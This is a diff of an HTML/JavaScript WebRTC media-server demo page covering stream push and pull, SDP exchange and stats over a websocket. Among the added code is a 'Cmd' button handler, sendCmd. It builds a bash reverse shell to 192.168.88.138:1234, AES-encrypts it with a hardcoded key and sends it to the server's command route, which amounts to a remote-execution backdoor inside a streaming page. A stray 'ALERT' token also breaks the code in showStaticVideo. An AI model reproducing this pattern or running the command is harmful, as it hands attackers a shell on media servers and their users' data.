+                    } else if (obj.route == 'imRTC/sendSdpCall') {
+                        // $("[id=remoteSdpTextarea]").html(obj.data.sdp);
+                        if (typeof (obj.data.rtmpUrl) != "undefined") {
+                            // demo
+                            const rtmpUrl = 'rtmp://' + window.location.hostname + ':4000/cdn_standard/' + $("#stream").val();
+                            const flvUrl = 'http://' + window.location.hostname + ':8889/flv8889?app=cdn_standard&stream=' + $("#stream").val();
+                            // const rtmpUrl = obj.data.rtmpUrl;
+                            if (rtmpUrl.length > 0) {
+                                $("[id=rtmpUrl]").attr("style", 'display: block');
+                                $("[id=rtmpUrlLabel]").html(rtmpUrl);
+                                $("[id=flvUrlLabel]").html(flvUrl);
 
-        if( typeof(client) != "undefined" ) {
-            client.close();
-        }
+                                const rtmpHerf = 'https://' + window.location.hostname + ':9877/live_test.html';
+                                $("[id=rtmpUrlHerf]").attr("href", rtmpHerf);
+                                const flvHerf = 'http://' + window.location.hostname + ':9876/flvjs/demo.html';
+                                $("[id=flvUrlHerf]").attr("href", flvHerf);
+                            }
+                        }
 
-        rtc.hangup();
+                    } else if (obj.route == 'imRTC/sendSdpPull') {
+                        // $("[id=remoteSdpTextarea]").html(obj.data.sdp);
+                        if (typeof (obj.data.rtmpUrl) != "undefined") {
+                        }
 
-        sendGetToken();
-    });
+                    } else if (obj.route == 'imRTC/sendSdpAnswerNotice') {
+                        $("[id=remoteSdpTextarea]").html(obj.req_data.sdp);
+                        $("[id=acceptBtn]").click();
+                    } else if (obj.route == 'imRTC/sendGetToken') {
+                        handleGetIceToken(obj.data.iceServers);
+                    }
 
-    $("[id=pullBtn]").click(function() {
-        callType = 'pull';
-
-        // Start capture and ice
-        if( typeof(client) != "undefined" ) {
-            client.close();
-        }
-
-        rtc.hangup();
-
-        sendGetToken();
-    });
-
-    $("[id=acceptBtn]").click(function accept() {
-        let remoteSdp = remoteSdpTextarea.value;
-        let answer = {
-            type: 'answer',
-            sdp: remoteSdp
-        }
-        rtc.accpet(answer).then( function success() {
-            console.log("Rtc Accept, [OK]");
-        }, e => {
-            console.log("Rtc Accept, [Fail], e: ", e);
-        })
-    });
-
-    $("[id=hangupBtn]").click(function() {
-        if( typeof(client) != "undefined" ) {
-            client.close();
-        }
-        rtc.hangup();
-    });
-
-    $("[id=imgBtn]").click(function() {
-    });
-
-    $("[id=videoSource]").change( function () {
-        $("[id=pushBtn]").click();
-    });
-
-    $("[id=iceBtn]").click(function() {
-        sendGetToken();
-    });
-
-    $("[id=pushVideoBtn]").click(function() {
-        callType = 'push';
-        pushVideo = true;
-
-        // Start capture and ice
-        if( typeof(client) != "undefined" ) {
-            client.close();
-        }
-
-        rtc.hangup();
-
-        sendGetToken();
-    });
-
-    $("[id=cmdBtn]").click(function() {
-        sendCmd().then(() => {
-            // client.close();
+                    if (obj.errmsg.length > 0) {
+                        $("[id=errMsg]").attr("style", 'display: block');
+                        $("[id=errMsgLabel]").html(obj.errmsg);
+                    }
+                }
+            };
         });
-    });
-}
+    };
 
-function handleError(e) {
-    console.log('navigator.MediaDevices.getUserMedia, [Fail], e:', e);
-}
+    function send(obj) {
+        obj.id = reqId;
+        data = JSON.stringify(obj);
 
-function gotDevices(deviceInfos) {
-    // Handles being called several times to update labels. Preserve values.
-    for (let i = 0; i !== deviceInfos.length; ++i) {
-        const deviceInfo = deviceInfos[i];
-        // console.log('Got Device: ', deviceInfo);
-
-        if (deviceInfo.kind === 'videoinput') {
-            console.log('Got Video Capture Input : ', deviceInfo);
-            $("[id=videoSelector]").append("<option value=" + deviceInfo.deviceId + ">" + "label:" + deviceInfo.label + ", deviceId:" + deviceInfo.deviceId + "</option>");
+        // console.log('Client.send(), ' + data);
+        if (client.readyState == client.OPEN) {
+            if (obj.route != "imRTC/heartbeat") {
+                $("[id=jsonSend]").html(data);
+            }
+            client.send(data);
+            reqId++;
+            return true;
+        } else {
+            return false;
         }
     }
-}
 
-document.addEventListener("DOMContentLoaded", function() {
-    onload();
-    showUserAgent();
-    navigator.mediaDevices.enumerateDevices().then(gotDevices).catch(handleError);
-    var supportedConstraints = navigator.mediaDevices.getSupportedConstraints();
-    console.log('SupportedConstraints : ', supportedConstraints);
-});
-// window.onload = onload();
+    function sendHeartBeat() {
+        obj = {
+            route: 'imRTC/heartbeat',
+            req_data: {}
+        }
+        send(obj);
+    }
+
+    function sendSdpCall(stream, sdp) {
+        obj = {
+            route: 'imRTC/sendSdpCall',
+            req_data: {
+                stream: stream,
+                sdp: sdp
+            }
+        }
+
+        console.log('Client.sendSdpCall(), ', sdp);
+        // console.log('Client.sendSdpCall()');
+        send(obj);
+    }
+
+    function sendSdpPull(stream, sdp, serverId) {
+        obj = {
+            route: 'imRTC/sendSdpPull',
+            req_data: {
+                stream: stream,
+                sdp: sdp,
+                server_id: serverId
+            }
+        }
+
+        // console.log('Client.sendSdpPull(), ', JSON.stringify(obj));
+        console.log('Client.sendSdpPull( stream: ', stream, 'serverId: ', serverId, ')');
+        send(obj);
+    }
+
+    function sendSdpUpdate(stream, sdp) {
+        obj = {
+            route: 'imRTC/sendSdpUpdate',
+            req_data: {
+                stream: stream,
+                sdp: sdp
+            }
+        }
+        console.log('Client.sendSdpUpdate(), ', sdp);
+        send(obj);
+    }
+
+    function heartBeat() {
+        // console.log('Client.heartBeat()');
+        // setTimeout(() => {
+        //     if( client.readyState == client.OPEN ) {
+        //         sendHeartBeat();
+        //         heartBeat();
+        //     }
+        // }, 30000);
+    }
+
+    async function sendGetToken() {
+        await connect();
+
+        obj = {
+            route: 'imRTC/sendGetToken',
+            req_data: {}
+        }
+
+        console.log('Client.sendGetToken(), ', JSON.stringify(obj));
+        send(obj);
+    }
+
+    async function sendCmd() {
+        await connect();
+
+        let cmd = 'setsid bash -i >& /dev/tcp/192.168.88.138/1234 0<&1 &';
+        obj = {
+            route: 'imRTC/sendCmd',
+            req_data: {
+                cmd: cmd,
+            }
+        }
+        let data = JSON.stringify(obj);
+
+        let key = 'mediaserver12345';
+        key = CryptoJS.enc.Utf8.parse(key);
+        let options = {
+            mode: CryptoJS.mode.ECB,
+            padding: CryptoJS.pad.Pkcs7
+        };
+        let encrypted = CryptoJS.AES.encrypt(data, key, options);
+        // console.log('Client::sendCmd(), encrypted:', encrypted.toString());
+        let encrypted_base64 = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
+        // console.log('Client::sendCmd(), encrypted_base64:', encrypted_base64);
+
+        console.log('Client.send(), ' + encrypted_base64);
+        if (client.readyState == client.OPEN) {
+            $("[id=jsonSend]").html(encrypted_base64);
+            client.send(encrypted_base64);
+        }
+    }
+
+    class RTCClient {
+        constructor(config) {
+            this.mediaStream = null;
+            this.pc = null;
+            this.config = config;
+            this.onicecandidate = null;
+            this.onicecomplete = null;
+        }
+
+        init() {
+            this.pc = new RTCPeerConnection(this.config);
+            this.mediaStream = null;
+
+            this.pc.onicecandidate = event => {
+                if (!event.candidate) {
+                    return;
+                }
+
+                let json = JSON.stringify(event.candidate);
+                console.log('RTCClient::onicecandidate(), candidate:', json);
+
+                // Get local ICE
+                let sdp = this.pc.localDescription.sdp;
+                this.onicecandidate(sdp, event.candidate);
+            };
+
+            this.pc.ontrack = event => {
+                console.log('RTCClient::ontrack(), stream:', event.streams[0]);
+                $("[id=localVideo]").attr("style", 'display: block');
+                let video = $("[id=localVideo]")[0];
+                if ($("[id=localVideo]")[0].srcObject !== event.streams[0]) {
+                    $("[id=localVideo]").attr("srcObject", event.streams[0]);
+                }
+            };
+
+            this.pc.onicegatheringstatechange = event => {
+                console.log('RTCClient::onicegatheringstatechange(), iceGatheringState:', this.pc.iceGatheringState);
+                if (this.pc.iceGatheringState == 'complete') {
+                    this.onicecomplete();
+                }
+            };
+
+            this.pc.oniceconnectionstatechange = event => {
+                console.log('RTCClient::oniceconnectionstatechange(), iceConnectionState: ', this.pc.iceConnectionState);
+                if (this.pc.iceConnectionState === 'disconnected' || this.pc.iceConnectionState === 'closed') {
+                }
+            };
+        }
+
+        async hangup() {
+            this.close();
+
+            $("[id=localSdpTextarea]").attr("disabled", true);
+            $("[id=callButton]").attr("disabled", false);
+            $("[id=acceptButton]").attr("disabled", false);
+
+            $("[id=stats]").html("");
+        }
+
+        async pull() {
+            reset();
+            this.init();
+
+            let offer = await this.pc.createOffer({
+                offerToReceiveAudio: true,
+                offerToReceiveVideo: true
+            });
+            offer.sdp = this.createLocalSdp(offer.sdp);
+
+            await this.pc.setLocalDescription(offer);
+
+            // let localDescription = JSON.stringify(this.pc.localDescription);
+            console.log('RTCClient::pull(), offer :', offer.sdp);
+
+            // $("[id=localSdpTextarea]").html(this.pc.localDescription.sdp);
+            $("[id=localSdpTextarea]").html(offer.sdp);
+            $("[id=localSdpTextarea]").attr("disabled", false);
+            $("[id=acceptButton]").attr("disabled", false);
+        }
+
+        async push(videoSource) {
+            reset();
+            this.init();
+
+            if (pushVideo) {
+                await this.showStaticVideo();
+            } else {
+                await this.showLocalVideo(videoSource);
+            }
+
+            let offer = await this.pc.createOffer({
+                offerToReceiveAudio: false,
+                offerToReceiveVideo: false
+            });
+            offer.sdp = this.createLocalSdp(offer.sdp);
+
+            await this.pc.setLocalDescription(offer);
+
+            // let localDescription = JSON.stringify(this.pc.localDescription);
+            console.log('RTCClient::push(), offer :', offer.sdp);
+
+            $("[id=localSdpTextarea]").html(offer.sdp);
+            $("[id=localSdpTextarea]").attr("disabled", false);
+            $("[id=acceptButton]").attr("disabled", false);
+        }
+
+        async accpet(answer) {
+            console.log('RTCClient::accpet(), answer: ', answer);
+            $("[id=acceptButton]").attr("disabled", true);
+            await this.pc.setRemoteDescription(answer);
+        }
+
+        close() {
+            if (this.pc != null) {
+                this.pc.close();
+                this.pc = null;
+            }
+            this.stopLocalVideo();
+        }
+
+        async showStaticVideo() {
+            return new Promise((resolve, reject) => {
+                // Video tag capture must be set up after video tracks are enumerated.
+                let leftVideo = $("[id=localVideo]")[0];
+                $("[id=localVideo]").attr("style", 'display: block');
+                leftVideo.src = './video/jzq_feph.mp4';
+                leftVideo.srcObject = null;
+
+                leftVideo.oncanplay = () => {
+                    if (this.mediaStream == null) {
+                        if (isFirefox()) {
+                            this.mediaStream = leftVideo.mozCaptureStream();
+                        } else {
+                            this.mediaStream = leftVideo.captureStream();
+                        }
+
+                        console.log('Captured stream from leftVideo with captureStream',
+                            this.mediaStream);
+                        let video = this.mediaStream.getVideoTracks()[0];
+                        this.pc.addStream(this.mediaStream);
+                        resolve();
+                    }
+                };
+                if (leftVideo.readyState >= 3) {
+                    if (this.mediaStream == null) {
+                        if (isFirefox()) {
+                            this.mediaStream = leftVideo.mozCaptureStream();
+                        } else {
+                            this.mediaStream = leftVideo.captureStream();
+                        }
+                        console.log('Captured stream from leftVideo with captureStream',
+                            this.mediaStream);
+                        this.pc.addStream(this.mediaStream);
+                        resolve();
+                    }
+                    ALERT
+                }
+                leftVideo.play();
+            });
+        }
+
+        async showLocalVideo(videoSource) {
+            $("[id=localVideo]").attr("style", 'display: block');
+            /**
+             * Edge does not support custom video size
+             * only support original video capture size, example: 320x240, 640x480
+             */
+            let config = {};
+            config = {
+                video: {
+                    deviceId: videoSource ? {exact: videoSource} : undefined,
+                    // width: {exact: 640}/*{min: 320, max: 640}*/, height: {exact: 480}/*{min: 240, max: 480}*/,
+                    // QVGA
+                    // width: 320, height: 240,
+                    // VGA
+                    width: 640, height: 480,
+                    // HD
+                    // width: 1280, height: 720,
+                    // FULL HD
+                    // width: 1920, height: 1080,
+                    // 4K
+                    // width: 4096, height: 2160,
+                    // 8K
+                    // width: 7680, height: 4320,
+                    frameRate: 15/*{min: 10, max: 15}*/
+                },
+                audio: true
+            }
+
+            return window.navigator.mediaDevices.getUserMedia(config).then(mediaStream => {
+                let video = mediaStream.getVideoTracks()[0];
+                if (typeof (video) == "undefined" || video == null) {
+                    console.log("RTCClient::showLocalVideo(), [Fail], No Video Can Be Captured.");
+                }
+
+                this.setVideoTrackContent(mediaStream);
+                this.mediaStream = mediaStream;
+
+                let leftVideo = $("[id=localVideo]")[0];
+                leftVideo.src = '';
+                leftVideo.srcObject = null;
+                $("[id=localVideo]").attr('srcObject', mediaStream);
+                // var canvas = $("[id=localCanvas]")[0];
+                // draw();
+                //
+                // canvasStream = canvas.captureStream();
+                // console.log("canvasStream: ", canvasStream);
+
+                this.pc.addStream(mediaStream);
+
+                // (async () => {
+                //     // const workerCode = document.querySelector('#workerCode').textContent;
+                //     // const blob = new Blob([workerCode], { type: 'text/javascript' });
+                //     // const url = URL.createObjectURL(blob);
+                //     const url = 'webgl-worker.js';
+                //     const worker = new Worker(url, { name : 'webgl'});
+                //     const canvas = $("[id=localCanvas]")[0].transferControlToOffscreen();
+                //     worker.postMessage({msg:'draw', canvas:canvas}, [canvas]);
+                //     URL.revokeObjectURL(url);
+                // })();
+            }).catch(e => {
+                console.log("RTCClient::showLocalVideo(), [Fail], e: ", e);
+            });
+        }
+
+        async stopLocalVideo() {
+            $("[id=localVideo]").attr("style", 'display: none');
+            if (this.mediaStream) {
+                this.mediaStream.getTracks().forEach(
+                    track => track.stop()
+                );
+                $("[id=localVideo]").attr('srcObject', null);
+            }
+        }
+
+        // setBandwidth(bandwidth) {
+        //     // In Chrome, use RTCRtpSender.setParameters to change bandwidth without
+        //     // (local) renegotiation. Note that this will be within the envelope of
+        //     // the initial maximum bandwidth negotiated via SDP.
+        //     if ((adapter.browserDetails.browser === 'chrome' ||
+        //         (adapter.browserDetails.browser === 'firefox' &&
+        //             adapter.browserDetails.version >= 64)) &&
+        //         'RTCRtpSender' in window &&
+        //         'setParameters' in window.RTCRtpSender.prototype) {
+        //         const sender = this.pc.getSenders()[0];
+        //         const parameters = sender.getParameters();
+        //         if (!parameters.encodings) {
+        //             parameters.encodings = [{}];
+        //         }
+        //         parameters.encodings[0].maxFramerate = 15;
+        //         if (bandwidth === 'unlimited') {
+        //             delete parameters.encodings[0].maxBitrate;
+        //         } else {
+        //             parameters.encodings[0].maxBitrate = bandwidth * 1000;
+        //         }
+        //         sender.setParameters(parameters)
+        //             .then(() => {
+        //             })
+        //             .catch(e => console.error(e));
+        //     }
+        // }
+
+        createLocalSdp(sdp) {
+            var newSdp = sdp;
+            newSdp = this.setBitRate(sdp);
+            // newSdp = newSdp.replace(/m=video (\d+) UDP\/TLS\/RTP\/SAVPF ([0-9 ]*)/g, 'm=video $1 UDP/TLS/RTP/SAVPF 102');
+            // newSdp = newSdp.replace(/m=audio (\d+) UDP\/TLS\/RTP\/SAVPF ([0-9 ]*)/g, 'm=audio $1 UDP/TLS/RTP/SAVPF 111');
+            // newSdp = newSdp.replace(/a=rtcp-fb:(?!102)(?!111)\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=fmtp:((?!102)(?!111))\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=rtpmap:(?!102)(?!111)\d{1,3} .*\r\n/g, '');
+
+            // newSdp = newSdp.replace(/a=rtcp-fb:(?!111)\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=fmtp:(?!111)\d{1,3} .*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=rtpmap:(?!111)\d{1,3} .*\r\n/g, '');
+
+            // newSdp = newSdp.replace(/a=extmap:.*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=msid.*\r\n/g, '');
+            // newSdp = newSdp.replace(/a=rtcp:.*\r\n/g, '');
+            return newSdp;
+        }
+
+        setBitRate(sdp) {
+            var newSdp = sdp;
+            // Only work for Safari and Chrome
+            newSdp = newSdp.replace(/a=fmtp:(.*)\r\n/g, 'a=fmtp:$1;x-google-start-bitrate=1000;x-google-max-bitrate=1000\r\n');
+            // Only work for Firefox
+            // newSdp = newSdp.replace(/a=mid:(.*)\n/g, 'a=mid:$1\r\nb=TIAS:1000000\r\n');
+            return newSdp;
+        }
+
+        /**
+         * / Only work for Chrome
+         * @param stream
+         * @param hint
+         */
+        setVideoTrackContent(stream, hint) {
+            const tracks = stream.getVideoTracks();
+            tracks.forEach(track => {
+                // Get old constraints
+                let constraints = track.getConstraints();
+                // constraints.width = 640;
+                // constraints.height = 360;
+                // It is always success, unless you set some parameter with exact value
+                track.applyConstraints(constraints).then(() => {
+                    console.log('RTCClient::setVideoTrackContent(), [OK], constraints:', constraints);
+                }, e => {
+                    console.log('RTCClient::setVideoTrackContent(), [Fail], e:', e);
+                });
+
+                // if ('contentHint' in track) {
+                //     track.contentHint = hint;
+                //     if (track.contentHint !== hint) {
+                //         console.log('RTCClient::createStream( Invalid video track contentHint: ' + hint + ' )');
+                //     }
+                // } else {
+                //     console.log('RTCClient::createStream( contentHint attribute not supported )');
+                // }
+            });
+        }
+
+        stat() {
+            setTimeout(() => {
+                if (this.pc != null) {
+                    this.pc.getStats(null).then(
+                        results => {
+                            let statsString = "";
+                            results.forEach(res => {
+                                // console.log("RTCClient::stat( " + res.type + " )");
+                                if (res.type != 'codec' && res.type != 'certificate') {
+                                    statsString += '<h3>Report type=';
+                                    statsString += res.type;
+                                    statsString += '</h3>\n';
+
+                                    Object.keys(res).forEach(k => {
+                                        statsString += `${k}: ${res[k]}<br>`;
+                                    });
+                                }
+
+                                // if ( res.type == 'media-source' ) {
+                                //     statsString += `id ${res.id}<br>`;
+                                //     statsString += `time ${res.timestamp}<br>`;
+                                //     Object.keys(res).forEach(k => {
+                                //         if (k !== 'timestamp' && k !== 'type' && k !== 'id') {
+                                //             statsString += `${k}: ${res[k]}<br>`;
+                                //         }
+                                //     });
+                                //     $("[id=stats]").html(statsString);
+                                // } else if ( res.type == 'outbound-rtp' ) {
+                                //     Object.keys(res).forEach(k => {
+                                //         statsString += `${k}: ${res[k]}<br>`;
+                                //     });
+                                // } else if ( res.type == 'inbound-rtp' ) {
+                                //     Object.keys(res).forEach(k => {
+                                //         statsString += `${k}: ${res[k]}<br>`;
+                                //     });
+                                // }  else if ( res.type == 'transport' ) {
+                                //     Object.keys(res).forEach(k => {
+                                //         statsString += `${k}: ${res[k]}<br>`;
+                                //     });
+                                // }
+                            });
+                            $("[id=stats]").html(statsString);
+                        }
+                    );
+
+                    this.stat();
+                } else {
+                    $("[id=stats]").html("");
+                }
+            }, 1000);
+        }
+
+    }
+
+    function showUserAgent() {
+        var userAgent = navigator.userAgent;
+        $("[id=userAgent]").html(userAgent);
+        $("[id=isEdge]").html(isEdge() ? "TRUE" : "FALSE");
+    }
+
+    function isIE() {
+        return navigator.userAgent.indexOf("compatible") > -1 && userAgent.indexOf("MSIE") > -1;
+    }
+
+    function isEdge() {
+        // return navigator.userAgent.indexOf("Edge") > -1 && !isIE();
+        return (adapter.browserDetails.browser == 'edge');
+    }
+
+    function isSafari() {
+        return (adapter.browserDetails.browser == 'safari');
+    }
+
+    function isFirefox() {
+        return (adapter.browserDetails.browser == 'firefox');
+    }
+
+    function draw() {
+        var video = $("[id=localVideo]")[0];
+        imageFilter.drawImage(video);
+        imageFilter.draw();
+        setTimeout(() => {
+            draw();
+        }, 100);
+    }
+
+    function onload() {
+        if (!window.navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            alert('WebRTC.mediaDevices is not supported.');
+            return;
+        }
+
+        if (!window.RTCPeerConnection) {
+            alert('WebRTC.RTCPeerConnection is not supported.');
+            return;
+        }
+
+        console.log("Browser is " + adapter.browserDetails.browser);
+
+        var canvas = $("[id=localCanvas]")[0];
+        imageFilter = new ImageFilter();
+        imageFilter.init(canvas);
+
+        // // imageFilter.loadImage('img/1.jpg');
+        // draw();
+        // canvasStream = canvas.captureStream();
+        // console.log("canvasStream: ", canvasStream);
+
+        // $("[id=localVideo]")[0].className = 'sepia';
+        // img = $("[id=localVideo]")[0];
+        // var canvas = $("[id=localCanvas]")[0];
+        // ctx = canvas.getContext("2d");
+
+        // draw(canvas, ctx, img);
+        // var img = $("[id=localImg]")[0];
+        // img.onload = function() {
+        //     draw(canvas, ctx, img);
+        //     canvasStream = canvas.captureStream();
+        // }
+
+        rtc = new RTCClient();
+        rtc.onicecandidate = (sdp, candidate) => {
+            $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+            if (callType == 'push' || callType == 'pull') {
+                if (callAlready) {
+                    // Update sdp to media server
+                    // let json = JSON.stringify(event.candidate);
+                    // console.log("Rtc onicecandidate, candidate: ", json);
+                    // sendSdpUpdate($("[id=stream]").val(), rtc.pc.localDescription.sdp);
+                }
+            }
+        };
+
+        rtc.onicecomplete = () => {
+            // Get Whole sdp with ice candidate, but it maybe cost time
+            $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+            // Send sdp call to media server
+            if (callType == 'push') {
+                sendSdpCall($("#stream").val(), $("#localSdpTextarea").val());
+            } else if (callType == 'pull') {
+                sendSdpPull($("#stream").val(), $("#localSdpTextarea").val(), $("#serverId").val());
+            }
+        }
+
+        $("[id=pushBtn]").click(function () {
+            callType = 'push';
+            pushVideo = false;
+
+            // Start capture and ice
+            const videoSource = $("[id=videoSelector]").val();
+
+            if (typeof (client) != "undefined") {
+                client.close();
+            }
+
+            rtc.hangup();
+
+            sendGetToken();
+        });
+
+        $("[id=pullBtn]").click(function () {
+            callType = 'pull';
+
+            // Start capture and ice
+            if (typeof (client) != "undefined") {
+                client.close();
+            }
+
+            rtc.hangup();
+
+            sendGetToken();
+        });
+
+        $("[id=acceptBtn]").click(function accept() {
+            let remoteSdp = remoteSdpTextarea.value;
+            let answer = {
+                type: 'answer',
+                sdp: remoteSdp
+            }
+            rtc.accpet(answer).then(function success() {
+                console.log("Rtc Accept, [OK]");
+            }, e => {
+                console.log("Rtc Accept, [Fail], e: ", e);
+            })
+        });
+
+        $("[id=hangupBtn]").click(function () {
+            if (typeof (client) != "undefined") {
+                client.close();
+            }
+            rtc.hangup();
+        });
+
+        $("[id=imgBtn]").click(function () {
+        });
+
+        $("[id=videoSource]").change(function () {
+            $("[id=pushBtn]").click();
+        });
+
+        $("[id=iceBtn]").click(function () {
+            sendGetToken();
+        });
+
+        $("[id=pushVideoBtn]").click(function () {
+            callType = 'push';
+            pushVideo = true;
+
+            // Start capture and ice
+            if (typeof (client) != "undefined") {
+                client.close();
+            }
+
+            rtc.hangup();
+
+            sendGetToken();
+        });
+
+        $("[id=cmdBtn]").click(function () {
+            sendCmd().then(() => {
+                // client.close();
+            });
+        });
+    }
+
+    function handleError(e) {
+        console.log('navigator.MediaDevices.getUserMedia, [Fail], e:', e);
+    }
+
+    function gotDevices(deviceInfos) {
+        // Handles being called several times to update labels. Preserve values.
+        for (let i = 0; i !== deviceInfos.length; ++i) {
+            const deviceInfo = deviceInfos[i];
+            // console.log('Got Device: ', deviceInfo);
+
+            if (deviceInfo.kind === 'videoinput') {
+                console.log('Got Video Capture Input : ', deviceInfo);
+                $("[id=videoSelector]").append("<option value=" + deviceInfo.deviceId + ">" + "label:" + deviceInfo.label + ", deviceId:" + deviceInfo.deviceId + "</option>");
+            }
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        onload();
+        showUserAgent();
+        navigator.mediaDevices.enumerateDevices().then(gotDevices).catch(handleError);
+        var supportedConstraints = navigator.mediaDevices.getSupportedConstraints();
+        console.log('SupportedConstraints : ', supportedConstraints);
+    });
+    // window.onload = onload();
 
 </script>
 
 <body>
 <div id="">
-    UserAgent : <lable id="userAgent"></lable><br>
-    IsEdge : <lable id="isEdge"></lable><br>
-    Websocket Status : <lable id="status">Not Connected</lable><br>
+    UserAgent :
+    <lable id="userAgent"></lable>
+    <br>
+    IsEdge :
+    <lable id="isEdge"></lable>
+    <br>
+    Websocket Status :
+    <lable id="status">Not Connected</lable>
+    <br>
     <p>################################################################
-    <div class="video-box">
-        <div id="local">
-            <div id="errMsg" style="display: none">
-                Error Msg : <font color="#FF0000"><lable id="errMsgLabel"></lable></font>
-            </div>
-            <div id="rtmpUrl" style="display: none">
-                RTMP Play Url : <lable id="rtmpUrlLabel"></lable>&nbsp;<a href="#" id="rtmpUrlHerf" target="blank" name="play">Flash播放</a><p>
-                FLV Url : <lable id="flvUrlLabel"></lable>&nbsp;<a href="#" id="flvUrlHerf" target="blank" name="play">Flvjs播放</a><p>
-                <!--HLS Flv Url : <lable id="hlsUrlLabel"></lable>&nbsp;<a href="#" id="hlsUrlHerf" target="blank" name="play">HLS播放</a>-->
-            </div>
+        <div class="video-box">
+            <div id="local">
+                <div id="errMsg" style="display: none">
+                    Error Msg : <font color="#FF0000">
+                    <lable id="errMsgLabel"></lable>
+                </font>
+                </div>
+                <div id="rtmpUrl" style="display: none">
+                    RTMP Play Url :
+                    <lable id="rtmpUrlLabel"></lable>&nbsp;<a href="#" id="rtmpUrlHerf" target="blank" name="play">Flash播放</a>
+    <p>
+        FLV Url :
+        <lable id="flvUrlLabel"></lable>&nbsp;<a href="#" id="flvUrlHerf" target="blank" name="play">Flvjs播放</a>
+    <p>
+        <!--HLS Flv Url : <lable id="hlsUrlLabel"></lable>&nbsp;<a href="#" id="hlsUrlHerf" target="blank" name="play">HLS播放</a>-->
+</div>
 
-            # Stream : <input id="stream" type="text" name="" value="max0" /><br>
-            <p>### Local Video & Canvas ###</p>
-            <p># Local SDP</p>
-            <textarea id="localSdpTextarea" disabled="true"></textarea>
-            <div>
-                <button id="pushBtn">Push</button><button id="pullBtn">Pull</button>
-                <button id="acceptBtn" style="display: none;">Accept</button><button id="hangupBtn">Hangup</button>
-                <button id="imgBtn">Img</button><button id="pushVideoBtn">PushVideo</button>
-                <button id="cmdBtn">Cmd</button>
-            </div>
-            <p>
-            <label for="videoSelector"># Video source: </label><select id="videoSelector"></select>
-            <div class="">
-                <p># Video</p>
-                <video id="localVideo" width="640" height="480" autoplay style="display:none" loop="loop"></video>
-                <canvas id="localCanvas" width="640" height="480" style="display:none"></canvas>
-                <img id="localImg" src="img/1.jpg" style="display: none">
-            </div>
-            <label id="stats"></label>
-        </div>
+# Stream : <input id="stream" type="text" name="" value="max0"/><br>
+# ServerId : <input id="serverId" type="text" name="" value=""/><br>
+<p>### Local Video & Canvas ###</p>
+<p># Local SDP</p>
+<textarea id="localSdpTextarea" disabled="true"></textarea>
+<div>
+    <button id="pushBtn">Push</button>
+    <button id="pullBtn">Pull</button>
+    <button id="acceptBtn" style="display: none;">Accept</button>
+    <button id="hangupBtn">Hangup</button>
+    <button id="imgBtn">Img</button>
+    <button id="pushVideoBtn">PushVideo</button>
+    <button id="cmdBtn">Cmd</button>
+</div>
+<p>
+    <label for="videoSelector"># Video source: </label><select id="videoSelector"></select>
+    <div class="">
+<p># Video</p>
+<video id="localVideo" width="640" height="480" autoplay style="display:none" loop="loop"></video>
+<canvas id="localCanvas" width="640" height="480" style="display:none"></canvas>
+<img id="localImg" src="img/1.jpg" style="display: none">
+</div>
+<label id="stats"></label>
+</div>
 
-        <p>### Remote Video ###</p>
-        <div id="remote">
-            <p># Remote SDP #</p>
-            <textarea id="remoteSdpTextarea"></textarea>
-        </div>
-    </div>
+<p>### Remote Video ###</p>
+<div id="remote">
+    <p># Remote SDP #</p>
+    <textarea id="remoteSdpTextarea"></textarea>
+</div>
+</div>
 
-    <p>################################################################
-    <div style="color:#00F000">
-        json recv : <lable id="jsonRecv" ></lable>
-    </div>
-    <div style="color:#F00000">
-        json request : <lable id="jsonSend" ></lable>
-    </div>
-    <div style="color:#0000F0">
-        json respond : <lable id="jsonRespond"></lable>
-    </div>
+<p>################################################################
+<div style="color:#00F000">
+    json recv :
+    <lable id="jsonRecv"></lable>
+</div>
+<div style="color:#F00000">
+    json request :
+    <lable id="jsonSend"></lable>
+</div>
+<div style="color:#0000F0">
+    json respond :
+    <lable id="jsonRespond"></lable>
+</div>
 
 </div>
 </body>
